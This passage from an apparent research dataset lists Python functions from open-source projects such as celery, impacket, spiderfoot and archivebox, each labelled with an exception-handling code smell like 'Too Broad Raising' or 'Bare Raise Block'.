            url=self.url_prefix + ""/invocations"",
            data=dump_input_data(data, params=params),
            headers={""Content-Type"": scoring_server.CONTENT_TYPE_JSON},
        )
        if response.status_code != 200:
            raise Exception(
                f""Invocation failed (error code {response.status_code}, response: {response.text})""
            )
        return PredictionsResponse.from_json(response.text)",Too Broad Raising,1
83,paddlehub,/home/r4ph/desenv/phd/exception-miner/projects/py/paddlehub/modules/image/Image_editing/super_resolution/swin2sr_real_sr_x4/module.py,real_sr,"def real_sr(self,
                image: Union[str, np.ndarray],
                visualization: bool = True,
                output_dir: str = ""swin2sr_real_sr_x4_output"") -> np.ndarray:
        if isinstance(image, str):
            _, file_name = os.path.split(image)
            save_name, _ = os.path.splitext(file_name)
            save_name = save_name + '_' + str(int(time.time())) + '.jpg'
            image = cv2.imdecode(np.fromfile(image, dtype=np.uint8), cv2.IMREAD_COLOR)
        elif isinstance(image, np.ndarray):
            save_name = str(int(time.time())) + '.jpg'
            image = image
        else:
            raise Exception(""image should be a str / np.ndarray"")

        with paddle.no_grad():
            img_input = self.preprocess(image)
            img_input = paddle.to_tensor(img_input[None, ...], dtype=paddle.float32)

            img_output = self.swin2sr(img_input)
            img_output = img_output.numpy()[0]
            img_output = self.postprocess(img_output)

        if visualization:
            if not os.path.isdir(output_dir):
                os.makedirs(output_dir)
            save_path = os.path.join(output_dir, save_name)
            cv2.imwrite(save_path, img_output)

        return img_output",Too Broad Raising,1
84,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/impacket/examples/ldap_shell.py,do_change_password,"def do_change_password(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(""Error expected a username and an optional password argument. Instead %d arguments were provided"" % len(args))

        user_dn = self.get_dn(args[0])
        print(""Got User DN: "" + user_dn)

        password = """"
        if len(args) == 1:
            password = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
        else:
            password = args[1]

        print(""Attempting to set new password of: %s"" % password)
        success = self.client.extend.microsoft.modify_password(user_dn, password)

        if self.client.result['result'] == 0:
            print('Password changed successfully!')
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])",Too Broad Raising,1
85,imgaug,/home/r4ph/desenv/phd/exception-miner/projects/py/imgaug/test/augmenters/test_blur.py,test_kernel_size_is_tuple,"def test_kernel_size_is_tuple(self):
        # k as (3, 4)
        aug = iaa.AverageBlur(k=(3, 4))
        nb_iterations = 100
        nb_seen = [0, 0]
        for i in sm.xrange(nb_iterations):
            observed = aug.augment_image(self.base_img)
            if np.array_equal(observed, self.blur3x3):
                nb_seen[0] += 1
            elif np.array_equal(observed, self.blur4x4):
                nb_seen[1] += 1
            else:
                raise Exception(""Unexpected result in AverageBlur@1"")
        p_seen = [v/nb_iterations for v in nb_seen]
        assert 0.4 <= p_seen[0] <= 0.6
        assert 0.4 <= p_seen[1] <= 0.6",Too Broad Raising,1
86,tvm,/home/r4ph/desenv/phd/exception-miner/projects/py/tvm/tests/python/unittest/test_meta_schedule_runner.py,timeout_session_creator,"def timeout_session_creator(  # pylint: disable=unused-variable
            device: Device,  # pylint: disable=unused-argument
            args_info: T_ARG_INFO_JSON_OBJ_LIST,  # pylint: disable=unused-argument
            alloc_repeat: int,  # pylint: disable=unused-argument
        ) -> RPCSession:
            raise Exception(""Test"")",Too Broad Raising,1
87,spiderfoot,/home/r4ph/desenv/phd/exception-miner/projects/py/spiderfoot/test/unit/modules/test_sfp_bitcoin.py,test_handleEvent_event_data_containing_bitcoin_string_in_legacy_base58_format_should_return_event,"def test_handleEvent_event_data_containing_bitcoin_string_in_legacy_base58_format_should_return_event(self):
        sf = SpiderFoot(self.default_options)

        module = sfp_bitcoin()
        module.setup(sf, dict())

        target_value = 'spiderfoot.net'
        target_type = 'INTERNET_NAME'
        target = SpiderFootTarget(target_value, target_type)
        module.setTarget(target)

        def new_notifyListeners(self, event):
            expected = 'BITCOIN_ADDRESS'
            if str(event.eventType) != expected:
                raise Exception(f""{event.eventType} != {expected}"")

            expected = '1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R'
            if str(event.data) != expected:
                raise Exception(f""{event.data} != {expected}"")

            raise Exception(""OK"")

        module.notifyListeners = new_notifyListeners.__get__(module, sfp_bitcoin)

        event_type = 'ROOT'
        event_data = 'example data 1HesYJSP1QqcyPEjnQ9vzBL1wujruNGe7R example data'
        event_module = ''
        source_event = ''

        evt = SpiderFootEvent(event_type, event_data, event_module, source_event)

        with self.assertRaises(Exception) as cm:
            module.handleEvent(evt)

        self.assertEqual(""OK"", str(cm.exception))",Too Broad Raising,1
88,localstack,/home/r4ph/desenv/exception-miner/projects/py/localstack/localstack/utils/time.py,parse_timestamp,"def parse_timestamp(ts_str: str) -> datetime:
    for ts_format in [
        TIMESTAMP_FORMAT,
        TIMESTAMP_FORMAT_TZ,
        TIMESTAMP_FORMAT_MICROS,
        TIMESTAMP_READABLE_FORMAT,
    ]:
        try:
            return datetime.strptime(ts_str, ts_format)
        except ValueError:
            pass
    raise Exception(""Unable to parse timestamp string with any known formats: %s"" % ts_str)",Too Broad Raising,1
89,spiderfoot,/home/r4ph/desenv/phd/exception-miner/projects/py/spiderfoot/test/integration/modules/test_sfp_adguard_dns.py,new_notifyListeners,"def new_notifyListeners(self, event):
            expected = 'BLACKLISTED_INTERNET_NAME'
            if str(event.eventType) != expected:
                raise Exception(f""{event.eventType} != {expected}"")

            expected = 'AdGuard - Family Filter [pornhub.com]'
            if str(event.data) != expected:
                raise Exception(f""{event.data} != {expected}"")

            raise Exception(""OK"")",Too Broad Raising,1
90,pysyft,/home/r4ph/desenv/phd/exception-miner/projects/py/pysyft/packages/syft/src/syft/protocol/data_protocol.py,build_state,"def build_state(self, stop_key: Optional[str] = None) -> dict:
        sorted_dict = sort_dict_naturally(self.protocol_history)
        state_dict = defaultdict(dict)
        for k, _v in sorted_dict.items():
            object_versions = sorted_dict[k][""object_versions""]
            for canonical_name, versions in object_versions.items():
                for version, object_metadata in versions.items():
                    action = object_metadata[""action""]
                    version = object_metadata[""version""]
                    hash_str = object_metadata[""hash""]
                    state_versions = state_dict[canonical_name]
                    if action == ""add"" and (
                        str(version) in state_versions.keys()
                        or hash_str in state_versions.values()
                    ):
                        raise Exception(
                            f""Can't add {object_metadata} already in state {versions}""
                        )
                    elif action == ""remove"" and (
                        str(version) not in state_versions.keys()
                        or hash_str not in state_versions.values()
                    ):
                        raise Exception(
                            f""Can't remove {object_metadata} missing from state {versions} for object {canonical_name}.""
                        )
                    if action == ""add"":
                        state_dict[canonical_name][str(version)] = hash_str
                    elif action == ""remove"":
                        del state_dict[canonical_name][str(version)]
            # stop early
            if stop_key == k:
                return state_dict
        return state_dict",Too Broad Raising,1
91,unilm,/home/r4ph/desenv/phd/exception-miner/projects/py/unilm/kosmos-g/fairseq/examples/textless_nlp/gslm/unit2speech/tacotron2/text.py,_clean_text,"def _clean_text(text, cleaner_names):
  for name in cleaner_names:
    cleaner = getattr(cleaners, name)
    if not cleaner:
      raise Exception('Unknown cleaner: %s' % name)
    text = cleaner(text)
  return text",Too Broad Raising,1
92,scapy,/home/r4ph/desenv/phd/exception-miner/projects/py/scapy/scapy/layers/x509.py,build,"def build(self, pkt):
        if ""signatureAlgorithm"" in pkt.fields:
            sigtype = pkt.fields['signatureAlgorithm'].algorithm.oidname
        else:
            sigtype = pkt.default_fields[""signatureAlgorithm""].algorithm.oidname  # noqa: E501
        if ""rsa"" in sigtype.lower():
            return ASN1F_SEQUENCE.build(self, pkt)
        elif ""ecdsa"" in sigtype.lower():
            pkt.default_fields[""signatureValue""] = ECDSASignature()
            return ASN1F_OCSP_BasicResponseECDSA().build(pkt)
        else:
            raise Exception(""could not build OCSP basic response"")",Too Broad Raising,1
93,loguru,/home/r4ph/desenv/phd/exception-miner/projects/py/loguru/tests/test_coroutine_sink.py,sink,"async def sink(msg):
        raise Exception(""Oh no"")",Too Broad Raising,1
94,impacket,/home/r4ph/desenv/phd/exception-miner/projects/py/impacket/impacket/examples/ldap_shell.py,do_rename_computer,"def do_rename_computer(self, line):
        args = shlex.split(line)

        if len(args) != 2:
            raise Exception(""Current Computer sAMAccountName and New Computer sAMAccountName required (rename_computer comp1$ comp2$)."")

        current_name = args[0]

        new_name = args[1]

        self.client.search(self.domain_dumper.root, '(sAMAccountName=%s)' % escape_filter_chars(current_name), attributes=['objectSid', 'sAMAccountName'])
        computer_dn = self.client.entries[0].entry_dn
        
        if not computer_dn:
            raise Exception(""Computer not found in LDAP: %s"" % current_name)

        entry = self.client.entries[0]
        samAccountName = entry[""samAccountName""].value
        print(""Original sAMAccountName: %s"" % samAccountName)

        print(""New sAMAccountName: %s"" % new_name)
        self.client.modify(computer_dn, {'sAMAccountName':(ldap3.MODIFY_REPLACE, [new_name])})
        
        if self.client.result[""result""] == 0:
            print(""Updated sAMAccountName successfully"")
        else:
            if self.client.result['result'] == 50:
                raise Exception('Could not modify object, the server reports insufficient rights: %s', self.client.result['message'])
            elif self.client.result['result'] == 19:
                raise Exception('Could not modify object, the server reports a constrained violation: %s', self.client.result['message'])
            else:
                raise Exception('The server returned an error: %s', self.client.result['message'])",Too Broad Raising,1
95,mindsdb,/home/r4ph/desenv/phd/exception-miner/projects/py/mindsdb/mindsdb/api/mongo/classes/session.py,get_salted_password,"def get_salted_password(self, username, method=None):
        real_user = self.config['auth'].get('username', '')
        password = self.config['auth'].get('password', '')
        if username != real_user:
            raise Exception(f'Wrong username {username}')

        salted_password = self.scram.salt_password(real_user, password)

        return base64.b64decode(self.scram.salt), salted_password",Too Broad Raising,1
96,unilm,/home/r4ph/desenv/phd/exception-miner/projects/py/unilm/kosmos-g/fairseq/fairseq/data/round_robin_zip_datasets.py,_deep_until_language_pair,"def _deep_until_language_pair(dataset):
            if isinstance(dataset, LanguagePairDataset):
                return dataset
            if hasattr(dataset, ""tgt_dataset""):
                return _deep_until_language_pair(dataset.tgt_dataset)
            if hasattr(dataset, ""dataset""):
                return _deep_until_language_pair(dataset.dataset)
            raise Exception(f""Don't know how to unwrap this dataset: {dataset}"")",Too Broad Raising,1
97,inter,/home/r4ph/desenv/exception-miner/projects/py/inter/misc/tools/restore-diacritics-kerning.py,getTTGlyphList,"def getTTGlyphList(font): # -> { 'Omega': [2126, ...], ... }
  if isinstance(font, str):
    font = ttLib.TTFont(font)

  if not 'cmap' in font:
    raise Exception('missing cmap table')
  
  gl = {}
  bestCodeSubTable = None
  bestCodeSubTableFormat = 0

  for st in font['cmap'].tables:
    if st.platformID == 0: # 0=unicode, 1=mac, 2=(reserved), 3=microsoft
      if st.format > bestCodeSubTableFormat:
        bestCodeSubTable = st
        bestCodeSubTableFormat = st.format

  if bestCodeSubTable is not None:
    for cp, glyphname in bestCodeSubTable.cmap.items():
      if glyphname in gl:
        gl[glyphname].append(cp)
      else:
        gl[glyphname] = [cp]

  return gl, font",Too Broad Raising,1
98,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_ocp.py,Jsbx,"def Jsbx(self, Jsbx):
        if isinstance(Jsbx, np.ndarray):
            self.__idxsbx = J_to_idx_slack(Jsbx)
        else:
            raise Exception('Invalid Jsbx value, expected numpy array. Exiting.')",Too Broad Raising,1
99,ansible,/home/r4ph/desenv/exception-miner/projects/py/ansible/test/integration/targets/module_utils_common.respawn/library/respawnme.py,main,"def main():
    mod = AnsibleModule(argument_spec=dict(
        mode=dict(required=True, choices=['multi_respawn', 'no_respawn', 'respawn'])
    ))

    # just return info about what interpreter we're currently running under
    if mod.params['mode'] == 'no_respawn':
        mod.exit_json(interpreter_path=sys.executable)
    elif mod.params['mode'] == 'respawn':
        if not has_respawned():
            new_interpreter = os.path.join(mod.tmpdir, 'anotherpython')
            os.symlink(sys.executable, new_interpreter)
            respawn_module(interpreter_path=new_interpreter)

            # respawn should always exit internally- if we continue executing here, it's a bug
            raise Exception('FAIL, should never reach this line')
        else:
            # return the current interpreter, as well as a signal that we created a different one
            mod.exit_json(created_interpreter=sys.executable, interpreter_path=sys.executable)
    elif mod.params['mode'] == 'multi_respawn':
        # blindly respawn with the current interpreter, the second time should bomb
        respawn_module(sys.executable)

    # shouldn't be any way for us to fall through, but just in case, that's also a bug
    raise Exception('FAIL, should never reach this code')",Too Broad Raising,1
100,chia-blockchain,/home/r4ph/desenv/phd/exception-miner/projects/py/chia-blockchain/chia/cmds/passphrase_funcs.py,async_update_daemon_passphrase_cache_if_running,"async def async_update_daemon_passphrase_cache_if_running(root_path: Path, config: Dict[str, Any]) -> None:
    """"""
    Attempt to connect to the daemon and update the cached passphrase
    """"""
    new_passphrase = Keychain.get_cached_master_passphrase()
    assert new_passphrase is not None

    try:
        async with acquire_connection_to_daemon(root_path, config, quiet=True) as daemon:
            if daemon is not None:
                response = await daemon.unlock_keyring(new_passphrase)
                if response is None:
                    raise Exception(""daemon didn't respond"")

                success: bool = response.get(""data"", {}).get(""success"", False)
                if success is False:
                    error = response.get(""data"", {}).get(""error"", ""unknown error"")
                    raise Exception(error)
    except Exception as e:
        print(f""Failed to notify daemon of updated keyring passphrase: {e}"")",Too Broad Raising,1
101,unilm,/home/r4ph/desenv/phd/exception-miner/projects/py/unilm/decoding/GAD/fairseq/optim/fused_adam.py,__init__,"def __init__(self, *args, **kwargs):
            super().__init__(*args, **kwargs)
            if not hasattr(self, ""multi_tensor_adam""):
                raise Exception(
                    ""Apex installation is outdated. Please install an updated version of apex.""
                )",Too Broad Raising,1
102,sentry,/home/r4ph/desenv/exception-miner/projects/py/sentry/tests/sentry/utils/test_safe.py,test_with_instance_method,"def test_with_instance_method(self):
        class Foo:
            def simple(self, a):
                return a

        assert safe_execute(Foo().simple, 1) == 1

        class Foo:
            def simple(self, a):
                raise Exception()

        assert safe_execute(Foo().simple, 1) is None",Too Broad Raising,1
103,openbbterminal,/home/r4ph/desenv/phd/exception-miner/projects/py/openbbterminal/openbb_terminal/core/completer/choices.py,build_controller_choice_map,"def build_controller_choice_map(controller) -> dict:
    command_list = controller.CHOICES_COMMANDS
    controller_choice_map: dict = {c: {} for c in controller.controller_choices}
    controller_choice_map[""support""] = controller.SUPPORT_CHOICES
    controller_choice_map[""about""] = controller.ABOUT_CHOICES
    controller_choice_map[""hold""] = controller.HELP_CHOICES

    for command in command_list:
        try:
            argument_parser = _get_argument_parser(
                controller=controller,
                command=command,
            )
            controller_choice_map[command] = _build_command_choice_map(
                argument_parser=argument_parser
            )
        except Exception as exception:
            if get_current_system().DEBUG_MODE:
                raise Exception(
                    f""On command : `{command}`.\n{str(exception)}""
                ) from exception

    return controller_choice_map",Too Broad Raising,1
104,luigi,/home/r4ph/desenv/exception-miner/projects/py/luigi/test/worker_test.py,run,"def run(self):
                raise Exception(""b0rk"")",Too Broad Raising,1
105,openpilot,/home/r4ph/desenv/exception-miner/projects/py/openpilot/third_party/acados/acados_template/acados_ocp.py,Jbu,"def Jbu(self, Jbu):
        if isinstance(Jbu, np.ndarray):
            self.__idxbu = J_to_idx(Jbu)
        else:
            raise Exception('Invalid Jbu value. Exiting.')",Too Broad Raising,1
106,autokeras,/home/r4ph/desenv/phd/exception-miner/projects/py/autokeras/docs/tutobooks.py,_shorten_lines,"def _shorten_lines(py):
    max_len = 90
    lines = []
    for line in py.split(""\n""):
        if len(line) <= max_len:
            lines.append(line)
            continue
        i = 0
        while len(line) > max_len:
            line = line.lstrip()
            if "" "" not in line[1:]:
                lines.append(line)
                break
            else:
                short_line = line[:max_len]
                line = line[max_len:]
                if "" "" in short_line:
                    reversed_short_line = short_line[::-1]
                    index = reversed_short_line.find("" "") + 1
                    line = short_line[-index:] + line
                    short_line = short_line[:-index]

                lines.append(short_line.lstrip())
            i += 1
            if i > 10:
                raise
        lines.append(line.lstrip())
    return ""\n"".join(lines)",Bare Raise Block,1
107,transformers,/home/r4ph/desenv/exception-miner/projects/py/transformers/tests/models/mbart/test_modeling_mbart.py,assert_tensors_close,"def assert_tensors_close(a, b, atol=1e-12, prefix=""""):
    """"""If tensors have different shapes, different values or a and b are not both tensors, raise a nice Assertion error.""""""
    if a is None and b is None:
        return True
    try:
        if torch.allclose(a, b, atol=atol):
            return True
        raise
    except Exception:
        pct_different = (torch.gt((a - b).abs(), atol)).float().mean().item()
        if a.numel() > 100:
            msg = f""tensor values are {pct_different:.1%} percent different.""
        else:
            msg = f""{a} != {b}""
        if prefix:
            msg = prefix + "": "" + msg
        raise AssertionError(msg)",Bare Raise Block,1
108,kivy,/home/r4ph/desenv/phd/exception-miner/projects/py/kivy/kivy/clock.py,handle_exception,"def handle_exception(self, e):
        from kivy.base import ExceptionManager

        if ExceptionManager.handle_exception(e) == ExceptionManager.RAISE:
            raise",Bare Raise Block,1
109,scapy,/home/r4ph/desenv/phd/exception-miner/projects/py/scapy/scapy/contrib/diameter.py,AVP,"def AVP(avpId, **fields):
    """""" Craft an AVP based on its id and optional parameter fields""""""
    val = None
    classType = AVP_Unknown
    if isinstance(avpId, str):
        try:
            for vnd in AvpDefDict:
                for code in AvpDefDict[vnd]:
                    val = AvpDefDict[vnd][code]
                    if val[0][:len(
                            avpId)] == avpId:  # A prefix of the full name is considered valid  # noqa: E501
                        raise
            found = False
        except BaseException:
            found = True
    else:
        if isinstance(avpId, list):
            code = avpId[0]
            vnd = avpId[1]
        else:  # Assume this is an int
            code = avpId
            vnd = 0
        try:
            val = AvpDefDict[vnd][code]
            found = True
        except BaseException:
            found = False
    if not found:
        warning('The AVP identifier %s has not been found.' % str(avpId))
        if isinstance(avpId, str):  # The string input is not valid
            return None
    # At this point code, vnd are provisionned val may be set (if found is True)  # noqa: E501
    # Set/override AVP code
    fields['avpCode'] = code
    # Set vendor if not already defined and relevant
    if 'avpVnd' not in fields and vnd:
        fields['avpVnd'] = vnd
    # Set flags if not already defined and possible ...
    if 'avpFlags' not in fields:
        if val:
            fields['avpFlags'] = val[2]
        else:
            fields['avpFlags'] = 128 if vnd else 0
    # Finally, set the name and class if possible
    if val:
        classType = val[1]
    _ret = classType(**fields)
    if val:
        _ret.name = 'AVP ' + val[0]
    return _ret",Bare Raise Block,1
110,celery,/home/r4ph/desenv/exception-miner/projects/py/celery/celery/app/trace.py,build_tracer,"def build_tracer(
        name: str,
        task: Union[celery.Task, celery.local.PromiseProxy],
        loader: Optional[celery.loaders.app.AppLoader] = None,
        hostname: Optional[str] = None,
        store_errors: bool = True,
        Info: Type[TraceInfo] = TraceInfo,
        eager: bool = False,
        propagate: bool = False,
        app: Optional[celery.Celery] = None,
        monotonic: Callable[[], int] = time.monotonic,
        trace_ok_t: Type[trace_ok_t] = trace_ok_t,
        IGNORE_STATES: FrozenSet[str] = IGNORE_STATES) -> \
        Callable[[str, Tuple[Any, ...], Dict[str, Any], Any], trace_ok_t]:
    """"""Return a function that traces task execution.

    Catches all exceptions and updates result backend with the
    state and result.

    If the call was successful, it saves the result to the task result
    backend, and sets the task status to `""SUCCESS""`.

    If the call raises :exc:`~@Retry`, it extracts
    the original exception, uses that as the result and sets the task state
    to `""RETRY""`.

    If the call results in an exception, it saves the exception as the task
    result, and sets the task state to `""FAILURE""`.

    Return a function that takes the following arguments:

        :param uuid: The id of the task.
        :param args: List of positional args to pass on to the function.
        :param kwargs: Keyword arguments mapping to pass on to the function.
        :keyword request: Request dict.

    """"""

    # pylint: disable=too-many-statements

    # If the task doesn't define a custom __call__ method
    # we optimize it away by simply calling the run method directly,
    # saving the extra method call and a line less in the stack trace.
    fun = task if task_has_custom(task, '__call__') else task.run

    loader = loader or app.loader
    ignore_result = task.ignore_result
    track_started = task.track_started
    track_started = not eager and (task.track_started and not ignore_result)

    # #6476
    if eager and not ignore_result and task.store_eager_result:
        publish_result = True
    else:
        publish_result = not eager and not ignore_result

    deduplicate_successful_tasks = ((app.conf.task_acks_late or task.acks_late)
                                    and app.conf.worker_deduplicate_successful_tasks
                                    and app.backend.persistent)

    hostname = hostname or gethostname()
    inherit_parent_priority = app.conf.task_inherit_parent_priority

    loader_task_init = loader.on_task_init
    loader_cleanup = loader.on_process_cleanup

    task_before_start = None
    task_on_success = None
    task_after_return = None
    if task_has_custom(task, 'before_start'):
        task_before_start = task.before_start
    if task_has_custom(task, 'on_success'):
        task_on_success = task.on_success
    if task_has_custom(task, 'after_return'):
        task_after_return = task.after_return

    pid = os.getpid()

    request_stack = task.request_stack
    push_request = request_stack.push
    pop_request = request_stack.pop
    push_task = _task_stack.push
    pop_task = _task_stack.pop
    _does_info = logger.isEnabledFor(logging.INFO)
    resultrepr_maxsize = task.resultrepr_maxsize

    prerun_receivers = signals.task_prerun.receivers
    postrun_receivers = signals.task_postrun.receivers
    success_receivers = signals.task_success.receivers

    from celery import canvas
    signature = canvas.maybe_signature  # maybe_ does not clone if already

    def on_error(
            request: celery.app.task.Context,
            exc: Union[Exception, Type[Exception]],
            state: str = FAILURE,
            call_errbacks: bool = True) -> Tuple[Info, Any, Any, Any]:
        """"""Handle any errors raised by a `Task`'s execution.""""""
        if propagate:
            raise
        I = Info(state, exc)
        R = I.handle_error_state(
            task, request, eager=eager, call_errbacks=call_errbacks,
        )
        return I, R, I.state, I.retval

    def trace_task(
            uuid: str,
            args: Sequence[Any],
            kwargs: Dict[str, Any],
            request: Optional[Dict[str, Any]] = None) -> trace_ok_t:
        """"""Execute and trace a `Task`.""""""

        # R      - is the possibly prepared return value.
        # I      - is the Info object.
        # T      - runtime
        # Rstr   - textual representation of return value
        # retval - is the always unmodified return value.
        # state  - is the resulting task state.

        # This function is very long because we've unrolled all the calls
        # for performance reasons, and because the function is so long
        # we want the main variables (I, and R) to stand out visually from the
        # the rest of the variables, so breaking PEP8 is worth it ;)
        R = I = T = Rstr = retval = state = None
        task_request = None
        time_start = monotonic()
        try:
            try:
                kwargs.items
            except AttributeError:
                raise InvalidTaskError(
                    'Task keyword arguments is not a mapping')

            task_request = Context(request or {}, args=args,
                                   called_directly=False, kwargs=kwargs)

            redelivered = (task_request.delivery_info
                           and task_request.delivery_info.get('redelivered', False))
            if deduplicate_successful_tasks and redelivered:
                if task_request.id in successful_requests:
                    return trace_ok_t(R, I, T, Rstr)
                r = AsyncResult(task_request.id, app=app)

                try:
                    state = r.state
                except BackendGetMetaError:
                    pass
                else:
                    if state == SUCCESS:
                        info(LOG_IGNORED, {
                            'id': task_request.id,
                            'name': get_task_name(task_request, name),
                            'description': 'Task already completed successfully.'
                        })
                        return trace_ok_t(R, I, T, Rstr)

            push_task(task)
            root_id = task_request.root_id or uuid
            task_priority = task_request.delivery_info.get('priority') if \
                inherit_parent_priority else None
            push_request(task_request)
            try:
                # -*- PRE -*-
                if prerun_receivers:
                    send_prerun(sender=task, task_id=uuid, task=task,
                                args=args, kwargs=kwargs)
                loader_task_init(uuid, task)
                if track_started:
                    task.backend.store_result(
                        uuid, {'pid': pid, 'hostname': hostname}, STARTED,
                        request=task_request,
                    )

                # -*- TRACE -*-
                try:
                    if task_before_start:
                        task_before_start(uuid, args, kwargs)

                    R = retval = fun(*args, **kwargs)
                    state = SUCCESS
                except Reject as exc:
                    I, R = Info(REJECTED, exc), ExceptionInfo(internal=True)
                    state, retval = I.state, I.retval
                    I.handle_reject(task, task_request)
                    traceback_clear(exc)
                except Ignore as exc:
                    I, R = Info(IGNORED, exc), ExceptionInfo(internal=True)
                    state, retval = I.state, I.retval
                    I.handle_ignore(task, task_request)
                    traceback_clear(exc)
                except Retry as exc:
                    I, R, state, retval = on_error(
                        task_request, exc, RETRY, call_errbacks=False)
                    traceback_clear(exc)
                except Exception as exc:
                    I, R, state, retval = on_error(task_request, exc)
                    traceback_clear(exc)
                except BaseException:
                    raise
                else:
                    try:
                        # callback tasks must be applied before the result is
                        # stored, so that result.children is populated.

                        # groups are called inline and will store trail
                        # separately, so need to call them separately
                        # so that the trail's not added multiple times :(
                        # (Issue #1936)
                        callbacks = task.request.callbacks
                        if callbacks:
                            if len(task.request.callbacks) > 1:
                                sigs, groups = [], []
                                for sig in callbacks:
                                    sig = signature(sig, app=app)
                                    if isinstance(sig, group):
                                        groups.append(sig)
                                    else:
                                        sigs.append(sig)
                                for group_ in groups:
                                    group_.apply_async(
                                        (retval,),
                                        parent_id=uuid, root_id=root_id,
                                        priority=task_priority
                                    )
                                if sigs:
                                    group(sigs, app=app).apply_async(
                                        (retval,),
                                        parent_id=uuid, root_id=root_id,
                                        priority=task_priority
                                    )
                            else:
                                signature(callbacks[0], app=app).apply_async(
                                    (retval,), parent_id=uuid, root_id=root_id,
                                    priority=task_priority
                                )

                        # execute first task in chain
                        chain = task_request.chain
                        if chain:
                            _chsig = signature(chain.pop(), app=app)
                            _chsig.apply_async(
                                (retval,), chain=chain,
                                parent_id=uuid, root_id=root_id,
                                priority=task_priority
                            )
                        task.backend.mark_as_done(
                            uuid, retval, task_request, publish_result,
                        )
                    except EncodeError as exc:
                        I, R, state, retval = on_error(task_request, exc)
                    else:
                        Rstr = saferepr(R, resultrepr_maxsize)
                        T = monotonic() - time_start
                        if task_on_success:
                            task_on_success(retval, uuid, args, kwargs)
                        if success_receivers:
                            send_success(sender=task, result=retval)
                        if _does_info:
                            info(LOG_SUCCESS, {
                                'id': uuid,
                                'name': get_task_name(task_request, name),
                                'return_value': Rstr,
                                'runtime': T,
                                'args': safe_repr(args),
                                'kwargs': safe_repr(kwargs),
                            })

                # -* POST *-
                if state not in IGNORE_STATES:
                    if task_after_return:
                        task_after_return(
                            state, retval, uuid, args, kwargs, None,
                        )
            finally:
                try:
                    if postrun_receivers:
                        send_postrun(sender=task, task_id=uuid, task=task,
                                     args=args, kwargs=kwargs,
                                     retval=retval, state=state)
                finally:
                    pop_task()
                    pop_request()
                    if not eager:
                        try:
                            task.backend.process_cleanup()
                            loader_cleanup()
                        except (KeyboardInterrupt, SystemExit, MemoryError):
                            raise
                        except Exception as exc:
                            logger.error('Process cleanup failed: %r', exc,
                                         exc_info=True)
        except MemoryError:
            raise
        except Exception as exc:
            _signal_internal_error(task, uuid, args, kwargs, request, exc)
            if eager:
                raise
            R = report_internal_error(task, exc)
            if task_request is not None:
                I, _, _, _ = on_error(task_request, exc)
        return trace_ok_t(R, I, T, Rstr)

    return trace_task",Bare Raise Block,1
111,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.5.4/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            # if no content was returned, dont save a title (because it might be a temporary error)
            if not html:
                raise ArchiveError('Unable to detect page title')
            # output = html[:128]       # use first bit of content as the title
            output = link.base_url      # use the filename as the title (better UX)
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
112,archivebox,/home/r4ph/desenv/exception-miner/projects/py/archivebox/deb_dist/archivebox-0.4.24/build/lib/archivebox/extractors/title.py,save_title,"def save_title(link: Link, out_dir: Optional[Path]=None, timeout: int=TIMEOUT) -> ArchiveResult:
    """"""try to guess the page's title from its content""""""

    setup_django(out_dir=out_dir)
    from core.models import Snapshot

    output: ArchiveOutput = None
    cmd = [
        CURL_BINARY,
        *CURL_ARGS,
        '--max-time', str(timeout),
        *(['--user-agent', '{}'.format(CURL_USER_AGENT)] if CURL_USER_AGENT else []),
        *([] if CHECK_SSL_VALIDITY else ['--insecure']),
        link.url,
    ]
    status = 'succeeded'
    timer = TimedProgress(timeout, prefix='      ')
    try:
        html = download_url(link.url, timeout=timeout)
        try:
            # try using relatively strict html parser first
            parser = TitleParser()
            parser.feed(html)
            output = parser.title
            if output is None:
                raise
        except Exception:
            # fallback to regex that can handle broken/malformed html
            output = extract_title_with_regex(html)
        
        # if title is better than the one in the db, update db with new title
        if isinstance(output, str) and output:
            if not link.title or len(output) >= len(link.title):
                Snapshot.objects.filter(url=link.url,
                                        timestamp=link.timestamp)\
                                .update(title=output)
        else:
            raise ArchiveError('Unable to detect page title')
    except Exception as err:
        status = 'failed'
        output = err
    finally:
        timer.end()

    return ArchiveResult(
        cmd=cmd,
        pwd=str(out_dir),
        cmd_version=CURL_VERSION,
        output=output,
        status=status,
        **timer.stats,
    )",Bare Raise Block,1
113,cython,/home/r4ph/desenv/phd/exception-miner/projects/py/cython/tests/run/reraise.py,reraise,"def reraise():
    raise",Bare Raise Block,1
114,apprise,/home/r4ph/desenv/phd/exception-miner/projects/py/apprise/apprise/plugins/NotifyStreamlabs.py,__init__,"def __init__(self, access_token,
                 call=StrmlabsCall.ALERT,
                 alert_type=StrmlabsAlert.DONATION,
